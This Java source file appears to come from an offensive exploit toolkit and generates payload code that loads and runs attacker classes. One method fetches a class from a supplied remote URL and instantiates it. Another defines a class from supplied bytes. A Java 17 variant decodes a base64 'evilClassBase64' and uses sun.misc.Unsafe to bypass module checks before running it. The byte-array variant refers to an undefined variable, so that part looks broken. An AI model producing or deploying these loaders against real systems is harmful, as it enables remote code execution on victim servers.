package com.h2tg.ysogate.bullet.defineClass;


public class JavaConverter
{
    public static String urldefineClass(String url, String className)
    {
        String code="URL[] urls = new URL[]{new URL(\""+url+"\")};\n" +
                "URLClassLoader.newInstance(urls).loadClass(\""+className+"\").newInstance();";
        return code;
    }

    public static String bytedefineClass(String baseCode)
    {
        String code="String b=\""+baseCode+"\";\n" +
                "ClassLoader cl = Thread.currentThread().getContextClassLoader();        \n" +
                "java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class);\n" +
                "defineClass.setAccessible(true);\n" +
                "Class c = (Class) defineClass.invoke(cl, \"Test\", code, 0, code.length);\n" +
                "c.newInstance();";
        return code;
    }

    public static String bytedefineClass17(String baseCode)
    {
        String code="        String evilClassBase64 = \""+baseCode+"\";\n" +
                "        byte[] bytes = java.util.Base64.getDecoder().decode(evilClassBase64);\n" +
                "        Class unsafeClass = Class.forName(\"sun.misc.Unsafe\");\n" +
                "        java.lang.reflect.Field field = unsafeClass.getDeclaredField(\"theUnsafe\");\n" +
                "        field.setAccessible(true);\n" +
                "        sun.misc.Unsafe unsafe = (sun.misc.Unsafe) field.get(null);\n" +
                "        java.lang.Module baseModule = Object.class.getModule();\n" +
                "        Class currentClass = Main.class;\n" +
                "        long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField(\"module\"));\n" +
                "        unsafe.putObject(currentClass, offset, baseModule);\n" +
                "        java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(\"defineClass\",byte[].class, int.class, int.class);\n" +
                "        method.setAccessible(true);\n" +
                "        ((Class)method.invoke(ClassLoader.getSystemClassLoader(), bytes, 0, bytes.length)).newInstance();";
        return code;
    }

}
